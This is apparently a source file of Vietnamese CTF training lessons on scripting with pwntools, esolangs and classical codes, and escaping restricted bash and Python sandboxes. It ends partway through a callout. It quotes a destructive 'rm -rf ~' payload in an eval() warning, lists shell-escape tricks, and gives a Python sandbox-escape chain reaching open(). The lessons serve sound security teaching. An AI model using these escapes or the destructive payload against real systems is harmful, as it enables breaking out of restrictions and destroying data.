/* Track: misc */

lesson({
  id: "misc-prog",
  track: "misc",
  order: 1,
  level: 2,
  title: "Lập trình & tự động hoá",
  short: "Viết script nói chuyện với server, giải bài cần tốc độ và thuật toán",
  time: "40 phút",
  html: `
<h2 id="vi-sao">Khi tay người không đủ nhanh</h2>
<p>Nhiều bài misc (và gần như mọi bài pwn) yêu cầu kết nối tới một dịch vụ qua <code>nc host port</code>. Dịch vụ hỏi liên tục, có giới hạn thời gian, hoặc hỏi hàng nghìn câu. Gõ tay là không thể, nên bạn phải <strong>viết script</strong>: đọc câu hỏi, tính đáp án, gửi lại, lặp lại.</p>
<p>Ba kỹ năng của bài này: (1) đọc hiểu giao thức của dịch vụ, (2) viết code tự động bằng Python, (3) chọn đúng thuật toán để không chạy quá giờ.</p>

<h2 id="giao-thuc">Bước 1: quan sát dịch vụ bằng tay</h2>
<p>Luôn kết nối thử một lần trước khi viết code. Ghi lại: server in gì trước câu hỏi, câu hỏi có định dạng gì, kết thúc bằng ký tự nào (thường là <code>: </code>, <code>&gt; </code> hay <code>\\n</code>), sai thì sao.</p>
${sh`
$ nc challenge.example.com 31337
Welcome! Solve 1000 problems in 30 seconds.
[1/1000] 4821 * 77 = ?
> 371217
Correct!
[2/1000] 9120 - 4433 = ?
>
`}

<h2 id="pwntools">Bước 2: tự động bằng pwntools</h2>
<p><strong>pwntools</strong> là thư viện Python chuẩn của dân CTF để làm việc với socket và chương trình. Các hàm dùng nhiều nhất:</p>
<table>
<tr><th>Hàm</th><th>Tác dụng</th></tr>
<tr><td><code>r = remote(host, port)</code></td><td>Mở kết nối TCP (thay cho nc). <code>process("./bin")</code> chạy chương trình cục bộ</td></tr>
<tr><td><code>r.recvuntil(b"> ")</code></td><td>Đọc cho tới khi gặp chuỗi, trả về bytes đã đọc</td></tr>
<tr><td><code>r.recvline()</code></td><td>Đọc một dòng</td></tr>
<tr><td><code>r.sendline(b"42")</code></td><td>Gửi kèm <code>\\n</code></td></tr>
<tr><td><code>r.sendlineafter(b"> ", b"42")</code></td><td>Chờ prompt rồi gửi, gộp hai lệnh trên</td></tr>
<tr><td><code>r.interactive()</code></td><td>Trả quyền điều khiển cho bạn (để đọc flag)</td></tr>
</table>
${py`
from pwn import *
import re

r = remote("challenge.example.com", 31337)
r.recvline()                                  # bỏ dòng Welcome
for _ in range(1000):
    q = r.recvuntil(b"= ?").decode()
    a, op, b = re.search(r"(-?\d+) ([+\-*/%]) (-?\d+)", q).groups()
    a, b = int(a), int(b)
    ans = {"+": a + b, "-": a - b, "*": a * b, "/": a // b, "%": a % b}[op]
    r.sendlineafter(b"> ", str(ans).encode())
print(r.recvall().decode())                   # chứa flag
`}
<div class="callout warn"><b>Đừng dùng eval() lên dữ liệu từ server</b>
<p>Viết <code>eval(q)</code> cho nhanh rất hấp dẫn, nhưng nếu server (hoặc đề bài) gửi về <code>__import__('os').system('rm -rf ~')</code> thì máy bạn chạy lệnh đó. Hãy tách số và phép toán bằng regex như trên.</p></div>

<h3>Không có pwntools: socket thuần</h3>
${py`
import socket
s = socket.create_connection(("challenge.example.com", 31337))
f = s.makefile("rw", newline="\n")
print(f.readline())
f.write("42\n"); f.flush()
`}

<h2 id="thuat-toan">Bước 3: chọn thuật toán</h2>
<p>Bài lập trình trong CTF hay xoay quanh vài dạng quen thuộc. Nhận ra dạng là đã giải được một nửa.</p>
<table>
<tr><th>Dạng đề</th><th>Thuật toán</th><th>Độ phức tạp</th></tr>
<tr><td>Đoán số, server trả lời lớn hơn / nhỏ hơn</td><td>Tìm kiếm nhị phân</td><td>log₂(n) lượt: 1 triệu số chỉ cần 20 lượt</td></tr>
<tr><td>Mê cung, đường đi ngắn nhất trên lưới</td><td>BFS</td><td>O(số ô)</td></tr>
<tr><td>Tìm x sao cho hash(x) bắt đầu bằng 0000 (proof-of-work)</td><td>Thử lần lượt (brute force)</td><td>trung bình 16<sup>k</sup> lần thử với k chữ số hex</td></tr>
<tr><td>Số Fibonacci thứ 10<sup>18</sup> mod m</td><td>Luỹ thừa ma trận / quy hoạch động</td><td>O(log n)</td></tr>
<tr><td>Hệ phương trình đồng dư</td><td>Định lý số dư Trung Hoa (CRT)</td><td>O(k)</td></tr>
<tr><td>Sudoku, ràng buộc logic</td><td>Backtracking hoặc solver z3</td><td>tuỳ đề</td></tr>
</table>

<h3>Tìm kiếm nhị phân</h3>
<p>Giữ khoảng <code>[lo, hi]</code> chắc chắn chứa đáp án. Đoán điểm giữa, mỗi câu trả lời loại đi một nửa khoảng.</p>
${py`
lo, hi = 1, 1_000_000
while lo <= hi:
    mid = (lo + hi) // 2
    reply = ask(mid)            # gửi mid, đọc "LỚN HƠN" / "NHỎ HƠN" / "ĐÚNG"
    if reply == "ĐÚNG": break
    if reply == "LỚN HƠN": lo = mid + 1
    else: hi = mid - 1
`}

<h3>Proof-of-work</h3>
<p>Nhiều server bắt bạn giải một câu đố hash trước khi cho vào bài (để chống spam). Dạng hay gặp: <em>"gửi x sao cho sha256(prefix + x) bắt đầu bằng 000000"</em>. Không có mẹo nào nhanh hơn thử lần lượt, vì hash không đảo ngược được.</p>
${py`
import hashlib, itertools
for n in itertools.count():
    if hashlib.sha256(str(n).encode()).hexdigest().startswith("0000"):
        print(n); break
`}

<h2 id="thuc-hanh">Thực hành</h2>
<p>Các dịch vụ dưới đây chạy trong terminal giả lập. Terminal này không chạy được Python, nên quy trình là: kết nối bằng <code>nc</code>, <strong>chép đề</strong> sang ô Python bên dưới, tính đáp án, rồi <strong>dán</strong> kết quả lại. Đó chính là những gì script pwntools làm, chỉ là bạn đóng vai socket.</p>
<div data-widget="shell" data-fs="misc-prog" data-height="340"></div>
<div data-widget="python"><template>
# Dán toàn bộ 100 dòng câu hỏi vào giữa ba dấu nháy
data = """
1) 4821 * 77
2) 9120 - 4433
"""

import re
answers = []
for line in data.strip().splitlines():
    m = re.search(r"(-?\\d+) ([+\\-*%]) (-?\\d+)", line)
    if not m:
        continue
    a, op, b = int(m[1]), m[2], int(m[3])
    answers.append({"+": a + b, "-": a - b, "*": a * b, "%": a % b}[op])

print(len(answers), "đáp án:")
print(" ".join(map(str, answers)))
</template></div>
<div data-chal="misc-prog-1"></div>
<div data-chal="misc-prog-2"></div>
<div data-chal="misc-prog-3"></div>
<div data-quiz="0"></div>
<div data-quiz="1"></div>
`,
  quiz: [
    {
      q: "Server chọn một số từ 1 đến 2<sup>32</sup> và trả lời lớn hơn / nhỏ hơn. Cần tối đa bao nhiêu lượt đoán nếu dùng tìm kiếm nhị phân?",
      options: ["16", "32", "1024", "65536"],
      answer: 1,
      explain: "Mỗi lượt loại một nửa khoảng, nên cần log₂(2<sup>32</sup>) = 32 lượt.",
    },
    {
      q: "Đề proof-of-work yêu cầu sha256(x) bắt đầu bằng 6 chữ số hex 0. Trung bình bạn phải thử khoảng bao nhiêu giá trị x?",
      options: ["6", "16 × 6 = 96", "16<sup>6</sup> ≈ 16,7 triệu", "2<sup>256</sup>"],
      answer: 2,
      explain: "Mỗi chữ số hex có 16 khả năng và hash coi như ngẫu nhiên, nên xác suất trúng là 1/16<sup>6</sup>.",
    },
  ],
  challenges: {
    "misc-prog-1": {
      title: "Speed Math 100", pts: 100, diff: "easy",
      hash: "ab11468ecefd227ceebfa64be82dd3b15ca4cf64fa4f10d96d88b1ecb395a0b8",
      body: "<p>Chạy <code>nc lab.zctf.local 4000</code> trong terminal ở trên. Server đưa 100 phép tính và chỉ cho 120 giây.</p>",
      hints: ["Bôi đen 100 dòng câu hỏi trong terminal, chép vào biến <code>data</code> của ô Python.", "Bấm Chạy, chép dòng đáp án cuối cùng, dán vào terminal sau <code>answers&gt;</code>. Nếu hết giờ, kết nối lại để có đề mới."],
    },
    "misc-prog-2": {
      title: "Đoán số", pts: 100, diff: "easy",
      hash: "9dfa89774eda2236b8dcb7d32c530fa2c2d3f9a597d61dc06f440f4a456a91f3",
      body: "<p><code>nc lab.zctf.local 4001</code>: đoán một số từ 1 đến 1 000 000, tối đa 20 lượt.</p>",
      hints: ["Đoán ngẫu nhiên gần như chắc chắn thua. 2<sup>20</sup> = 1 048 576 có gợi ý gì không?", "Bắt đầu với 500000. Nếu LỚN HƠN thì khoảng mới là 500001..1000000, đoán điểm giữa của nó. Ghi lo và hi ra giấy."],
    },
    "misc-prog-3": {
      title: "Proof of work", pts: 150, diff: "med",
      hash: "120544d646845088b09dac519c8d0f541b615fadb64a806bba6e38b61678896c",
      body: '<p>Tìm số nguyên dương <strong>nhỏ nhất</strong> <code>n</code> sao cho <code>sha256(str(n))</code> (dạng hex) bắt đầu bằng <code>00000</code> (năm số 0). Flag: <code>zCTF{pow_n}</code>, ví dụ <code>zCTF{pow_123}</code>.</p>',
      hints: ["Sửa đoạn code proof-of-work trong bài: đổi <code>\"0000\"</code> thành <code>\"00000\"</code> và bắt đầu đếm từ 1.", "Dán vào ô Python bên trên (xoá code cũ) và chạy. Mất vài giây vì phải thử khoảng nửa triệu số."],
    },
  },
});

lesson({
  id: "misc-eso",
  track: "misc",
  order: 2,
  level: 1,
  title: "Esolang & mã lạ",
  short: "Brainfuck, Ook!, Morse, Braille, Bacon, QR: nhận diện và giải",
  time: "35 phút",
  html: `
<h2 id="nhan-dien">Nhận diện là bước quan trọng nhất</h2>
<p>Bài loại này thường không khó về kỹ thuật. Khó ở chỗ bạn <strong>chưa từng thấy</strong> định dạng đó. Hãy để ý tập ký tự được dùng, rồi tra trên <a href="https://www.dcode.fr/cipher-identifier" target="_blank" rel="noopener">dCode Cipher Identifier</a> hoặc Google cụm ký tự lạ.</p>
<table>
<tr><th>Bạn thấy</th><th>Có thể là</th></tr>
<tr><td>Chỉ có <code>+ - &lt; &gt; [ ] . ,</code></td><td>Brainfuck</td></tr>
<tr><td><code>Ook. Ook? Ook!</code> lặp lại</td><td>Ook! (Brainfuck đổi tên lệnh)</td></tr>
<tr><td>Chỉ có <code>.</code> <code>-</code> và dấu cách / gạch chéo</td><td>Morse</td></tr>
<tr><td>Ký tự chấm nổi <code>⠁⠃⠉</code></td><td>Braille (chữ nổi)</td></tr>
<tr><td>Nhóm 5 ký tự chỉ gồm A/B (hoặc 0/1, chữ hoa/chữ thường)</td><td>Bacon cipher</td></tr>
<tr><td>Hình người cầm cờ</td><td>Semaphore</td></tr>
<tr><td>Ô vuông đen trắng có 3 góc định vị</td><td>QR code</td></tr>
<tr><td>Chỉ có dấu cách, tab và xuống dòng</td><td>Whitespace (esolang)</td></tr>
<tr><td>Trông như công thức nấu ăn hoặc kịch Shakespeare</td><td>Chef, Shakespeare (esolang)</td></tr>
</table>

<h2 id="brainfuck">Brainfuck</h2>
<p>Brainfuck có một băng nhớ 30 000 ô (mỗi ô 1 byte, ban đầu bằng 0), một con trỏ, và chỉ 8 lệnh. Mọi ký tự khác bị bỏ qua, nên có thể viết chú thích tự do.</p>
<table>
<tr><th>Lệnh</th><th>Ý nghĩa</th><th>Tương đương C</th></tr>
<tr><td><code>&gt;</code> / <code>&lt;</code></td><td>Dịch con trỏ sang phải / trái</td><td><code>p++</code> / <code>p--</code></td></tr>
<tr><td><code>+</code> / <code>-</code></td><td>Tăng / giảm ô hiện tại</td><td><code>(*p)++</code> / <code>(*p)--</code></td></tr>
<tr><td><code>.</code></td><td>In ô hiện tại ra dạng ký tự</td><td><code>putchar(*p)</code></td></tr>
<tr><td><code>,</code></td><td>Đọc 1 byte vào ô hiện tại</td><td><code>*p = getchar()</code></td></tr>
<tr><td><code>[</code> ... <code>]</code></td><td>Lặp khi ô hiện tại khác 0</td><td><code>while (*p) { ... }</code></td></tr>
</table>
<p>Mẫu hay gặp nhất là <strong>nhân bằng vòng lặp</strong>: <code>++++++++[&gt;++++++++&lt;-]&gt;+.</code> đặt ô 0 = 8, mỗi vòng cộng 8 vào ô 1 và trừ 1 ở ô 0. Sau 8 vòng ô 1 = 64, cộng 1 thành 65 rồi in ra <code>A</code>.</p>
<div data-widget="brainfuck"></div>
<p><strong>Ook!</strong> giữ nguyên 8 lệnh, chỉ thay mỗi lệnh bằng một cặp từ, ví dụ <code>Ook. Ook?</code> là <code>&gt;</code>, <code>Ook! Ook.</code> là <code>.</code>. Trình thông dịch ở trên có chế độ Ook!.</p>

<h2 id="morse">Morse</h2>
<p>Mỗi chữ là một dãy chấm (ngắn) và gạch (dài). Chữ cách nhau bằng dấu cách, từ cách nhau bằng <code>/</code>. Chữ hay gặp nhất có mã ngắn nhất: <code>E = .</code>, <code>T = -</code>. Trong file âm thanh, Morse là chuỗi tiếng bíp dài ngắn; mở bằng Audacity để nhìn dạng sóng. Trang <a href="#/tools/decode">Công cụ → Giải mã</a> có thao tác Morse Decode.</p>

<h2 id="braille">Braille (chữ nổi)</h2>
<p>Mỗi ký tự là một ô 2×3 chấm. Unicode có sẵn khối ký tự Braille (U+2800–U+28FF), nên đề thường cho dạng <code>⠓⠑⠇⠇⠕</code>.</p>
<table>
<tr><td>⠁ a</td><td>⠃ b</td><td>⠉ c</td><td>⠙ d</td><td>⠑ e</td><td>⠋ f</td><td>⠛ g</td><td>⠓ h</td><td>⠊ i</td><td>⠚ j</td><td>⠅ k</td><td>⠇ l</td><td>⠍ m</td></tr>
<tr><td>⠝ n</td><td>⠕ o</td><td>⠏ p</td><td>⠟ q</td><td>⠗ r</td><td>⠎ s</td><td>⠞ t</td><td>⠥ u</td><td>⠧ v</td><td>⠺ w</td><td>⠭ x</td><td>⠽ y</td><td>⠵ z</td></tr>
</table>

<h2 id="bacon">Bacon cipher</h2>
<p>Francis Bacon thiết kế cách giấu tin bằng hai "kiểu" ký tự, ví dụ chữ thường và chữ in nghiêng. Mỗi chữ cái thành một nhóm 5 ký tự A/B, thực chất là <strong>số nhị phân 5 bit</strong>: A = 0, B = 1. Ở biến thể 26 chữ, <code>a = AAAAA</code> (0), <code>b = AAAAB</code> (1), <code>c = AAABA</code> (2)… <code>z = BBAAB</code> (25).</p>
<div class="callout tip"><b>Mẹo</b>
<p>Nếu đề là một đoạn văn bình thường nhưng chữ hoa chữ thường lộn xộn kiểu <code>tHe QuICk</code>, thử coi chữ thường là A, chữ hoa là B. Có biến thể cũ 24 chữ (i/j và u/v dùng chung mã), thử cả hai.</p></div>

<h2 id="semaphore">Semaphore</h2>
<p>Bảng chữ cái bằng tư thế hai tay cầm cờ, mỗi tay chỉ một trong 8 hướng. Gặp ảnh người cầm cờ, tra bảng "flag semaphore" và đọc lần lượt từng tư thế.</p>

<h2 id="qr">QR code</h2>
<p>QR là ma trận ô đen trắng. Ba ô vuông lớn ở góc là <strong>finder pattern</strong> giúp máy quét định vị; phần còn lại gồm thông tin định dạng (mức sửa lỗi, mask), rồi đến dữ liệu.</p>
<ul>
<li><strong>Sửa lỗi Reed–Solomon</strong>: QR có 4 mức L, M, Q, H, khôi phục được khoảng 7%, 15%, 25%, 30% dữ liệu bị hỏng. Vì vậy QR bị che một phần vẫn quét được.</li>
<li><strong>Bài QR hỏng</strong>: thường bị mất finder pattern. Vẽ lại 3 góc (bằng Paint, GIMP) là quét được. Màu bị đảo ngược thì đảo lại.</li>
<li>Nếu mất quá nhiều, công cụ <a href="https://merri.cx/qrazybox/" target="_blank" rel="noopener">QRazyBox</a> cho phép tô lại từng ô và giải mã thủ công.</li>
<li>Đọc QR từ file: <code>zbarimg qr.png</code>.</li>
</ul>

<h2 id="thuc-hanh">Thực hành</h2>
<div data-chal="misc-eso-1"></div>
<div data-chal="misc-eso-2"></div>
<div data-chal="misc-eso-3"></div>
<div data-chal="misc-eso-4"></div>
<div data-quiz="0"></div>
<div data-quiz="1"></div>
`,
  quiz: [
    {
      q: "Đoạn Brainfuck <code>+++[&gt;++++&lt;-]&gt;</code> chạy xong thì ô số 1 bằng bao nhiêu?",
      options: ["7", "12", "3", "4"],
      answer: 1,
      explain: "Ô 0 = 3, vòng lặp chạy 3 lần, mỗi lần cộng 4 vào ô 1: 3 × 4 = 12.",
    },
    {
      q: "QR code bị một hình dán che khoảng 20% diện tích vẫn quét được. Lý do chính là gì?",
      options: ["Máy quét tự đoán nội dung", "QR có mã sửa lỗi Reed–Solomon", "Dữ liệu được lặp lại 2 lần", "Ba góc vuông lưu bản sao dữ liệu"],
      answer: 1,
      explain: "Ở mức sửa lỗi Q hoặc H, QR khôi phục được 25–30% dữ liệu hỏng. Ba góc vuông chỉ để định vị.",
    },
  ],
  challenges: {
    "misc-eso-1": {
      title: "Não bộ", pts: 50, diff: "easy",
      hash: "c56eaee1529a0e1b7392bb40361af838afea199e862524f903846950cee85c93",
      body: '<p>Chạy chương trình sau:</p><div class="chal-data">>+++++++++++[<+++++++++++>-]<+.>+++++++[<------->-]<------.>++++[<++++>-]<+.>++++[<--->-]<--.>+++++++[<+++++++>-]<++++.>+++++[<----->-]<.>++++[<++++>-]<.>++++++++[<------->-]<------.---.>++++++++[<+++++++>-]<+++++.--------.>+++++[<+++>-]<.>++++[<---->-]<--.++++++++.>++++[<--->-]<.>++++[<+++>-]<.>++++++++[<------->-]<---.>+++++++[<++++++>-]<+++++.>++++[<+++>-]<.---.>++++++++[<------->-]<.>+++++++++[<++++++++>-]<+++++.</div>',
      hints: ["Chép đoạn code vào trình thông dịch ở phần Brainfuck, chế độ Brainfuck, bấm Chạy."],
    },
    "misc-eso-2": {
      title: "Tiếng khỉ", pts: 75, diff: "easy",
      hash: "f8bbb70017ee65f90cc778e5e873ed43526efd4f77bd6b1d618f076ef7dd6e8c",
      body: '<p>Một con khỉ để lại đoạn này:</p><div class="chal-data" style="max-height:160px;overflow:auto">Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook! Ook! Ook? Ook! Ook? Ook. Ook. Ook. Ook! Ook. Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook? Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook! Ook! Ook? Ook! Ook? Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook! Ook! Ook? Ook! Ook? Ook. Ook. Ook. Ook! Ook. Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook? Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook! Ook! Ook? Ook! Ook? Ook. Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook! Ook! Ook? Ook! Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook? Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook! Ook! Ook? Ook! Ook? Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook. Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook! Ook! Ook? Ook! Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook? Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook! Ook! Ook? Ook! Ook? Ook. Ook! Ook. Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook? Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook! Ook! Ook? Ook! Ook? Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook. Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook! Ook! Ook? Ook! Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook? Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook! Ook! Ook? Ook! Ook? Ook. Ook! Ook. Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook! Ook! Ook? Ook! Ook? Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook? Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook! Ook! Ook? Ook! Ook? Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook! Ook! Ook? Ook! Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook? Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook! Ook! Ook? Ook! Ook? Ook. Ook! Ook. Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook! Ook! Ook? Ook! Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook.</div>',
      hints: ["Chỉ có ba từ Ook. Ook? Ook! Đây là ngôn ngữ nào?", "Đổi trình thông dịch sang chế độ Ook!, dán toàn bộ vào và chạy."],
    },
    "misc-eso-3": {
      title: "Thịt xông khói", pts: 100, diff: "med",
      hash: "b15543f7a4e2f4080e1ae7da9d41eed3ea8b01586a514914be7c3e45da84fd40",
      body: '<p>Biến thể 26 chữ cái. Flag là <code>zCTF{chữ_thường_viết_liền}</code>.</p><div class="chal-data">AABAB BAAAB AAAAA ABBAB AAABA ABAAA BAABA AAAAB AAAAA AAABA ABBBA ABBAB</div>',
      hints: ["Mỗi nhóm là số nhị phân 5 bit: A = 0, B = 1. <code>AABAB</code> = 00101 = 5.", "Số 0 là a, 1 là b… 5 là f. Hoặc dùng Python: <code>chr(int(g.replace('A','0').replace('B','1'), 2) + 97)</code>."],
    },
    "misc-eso-4": {
      title: "Chạm vào chữ", pts: 50, diff: "easy",
      hash: "4d3f22d3ba168837a10f6cef3f72b7814a5f9991aab7b69720a39586a34adad8",
      body: '<p>Flag là <code>zCTF{...}</code> với nội dung viết thường, dấu cách thay bằng <code>_</code>.</p><div class="chal-data" style="font-size:26px">⠉⠓⠁⠍ ⠝⠕⠊</div>',
      hints: ["Tra bảng Braille trong bài, từng ký tự một."],
    },
  },
});

lesson({
  id: "misc-jail",
  track: "misc",
  order: 3,
  level: 3,
  title: "Thoát khỏi jail",
  short: "Vượt sandbox Python và bash bị giới hạn",
  time: "45 phút",
  html: `
<h2 id="jail-la-gi">Jail là gì?</h2>
<p>Bài <strong>jail</strong> (hay <em>sandbox escape</em>) cho bạn chạy code trong một môi trường bị giới hạn: chặn một số từ khoá, xoá bớt hàm có sẵn, chỉ cho vài lệnh shell. Mục tiêu là vẫn đọc được flag. Bài học thực tế: <strong>blacklist gần như không bao giờ an toàn</strong>, vì một ngôn ngữ luôn có rất nhiều cách làm cùng một việc.</p>
${py`
# Một pyjail điển hình phía server
BLACKLIST = ["import", "open", "flag", "exec", "eval"]
code = input(">>> ")
if any(w in code for w in BLACKLIST):
    print("Hacker detected!")
else:
    print(eval(code))
`}

<h2 id="bash">Bash jail</h2>
<p>Shell bị hạn chế (<code>rbash</code>, hoặc script lọc lệnh) thường cấm <code>cat</code>, <code>cd</code>, dấu <code>/</code>… Nhưng có hàng chục chương trình khác cũng in được nội dung file:</p>
${sh`
$ rev flag.txt | rev
$ sort flag.txt
$ base64 flag.txt | base64 -d
$ xxd flag.txt
$ strings flag.txt
$ cut -c1- flag.txt
$ tr a a < flag.txt
$ while read l; do echo "$l"; done < flag.txt
$ echo "$(<flag.txt)"
`}
<p>Nếu cấm cả từ <code>flag</code>, dùng ký tự đại diện: <code>sort f*</code>, <code>sort fla?.txt</code>. Nếu được chạy <code>vi</code>, <code>less</code>, <code>awk</code>, <code>find</code>: xem trang <a href="https://gtfobins.github.io/" target="_blank" rel="noopener">GTFOBins</a> để biết cách mở shell đầy đủ từ chúng (ví dụ trong <code>vi</code> gõ <code>:!sh</code>).</p>
<div data-widget="shell" data-fs="misc-rbash" data-height="300"></div>
<div data-chal="misc-jail-1"></div>

<h2 id="py-chuoi">Pyjail mức 1: né blacklist bằng chuỗi</h2>
<p>Blacklist kiểm tra <strong>chuỗi code</strong>, còn Python đánh giá <strong>giá trị</strong> lúc chạy. Vì vậy chỉ cần tạo ra tên bị cấm lúc chạy thay vì viết thẳng ra:</p>
<table>
<tr><th>Kỹ thuật</th><th>Ví dụ (tạo ra chữ "open")</th></tr>
<tr><td>Nối chuỗi</td><td><code>'op' + 'en'</code></td></tr>
<tr><td>chr()</td><td><code>chr(111) + chr(112) + chr(101) + chr(110)</code></td></tr>
<tr><td>Đảo chuỗi</td><td><code>'nepo'[::-1]</code></td></tr>
<tr><td>Hex / escape</td><td><code>'\\x6fpen'</code></td></tr>
<tr><td>Giải mã</td><td><code>bytes.fromhex('6f70656e').decode()</code></td></tr>
</table>
<p>Có chuỗi rồi, lấy hàm theo tên bằng <code>getattr(đối_tượng, tên)</code> hoặc <code>vars(module)[tên]</code>. Trong <code>eval</code>, biến <code>__builtins__</code> chính là module chứa mọi hàm có sẵn:</p>
${py`
getattr(__builtins__, 'op' + 'en')        # == open
vars(__builtins__)['ev' + 'al']           # == eval
`}
<div data-widget="pyjail" data-level="1"></div>
<div data-chal="misc-jail-2"></div>

<h2 id="py-mro">Pyjail mức 2: không có builtins</h2>
<p>Server khôn hơn: <code>eval(code, {"__builtins__": {}})</code>. Giờ <code>open</code>, <code>getattr</code>, <code>chr</code>, <code>print</code> đều không tồn tại. Nhưng trong Python <strong>mọi thứ đều là đối tượng</strong>, và từ bất kỳ đối tượng nào cũng leo được lên lớp gốc <code>object</code>:</p>
<ol class="steps-v">
<li><code>()</code> là một tuple. <code>().__class__</code> là lớp <code>tuple</code>.</li>
<li><code>().__class__.__base__</code> (hoặc <code>.__mro__[1]</code>) là lớp <code>object</code>, cha của mọi lớp.</li>
<li><code>object.__subclasses__()</code> trả về <strong>mọi lớp</strong> đang được nạp trong chương trình, vài trăm lớp.</li>
<li>Tìm một lớp được định nghĩa bằng Python (không phải C), ví dụ <code>os._wrap_close</code>. Hàm <code>__init__</code> của nó có thuộc tính <code>__globals__</code>: từ điển biến toàn cục của module <code>os</code>.</li>
<li>Từ điển đó chứa <code>__builtins__</code> đầy đủ, trong đó có <code>open</code>.</li>
</ol>
${py`
# Liệt kê tên các lớp, tìm _wrap_close
[c.__name__ for c in ().__class__.__base__.__subclasses__()]

# Lấy lớp theo tên (an toàn hơn dùng chỉ số, vì chỉ số khác nhau giữa các máy)
[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == '_wrap_close'][0]

# Từ __init__.__globals__ đi tới builtins
X.__init__.__globals__['__builtins__']['op' + 'en']
`}
<div class="callout warn"><b>Lưu ý</b>
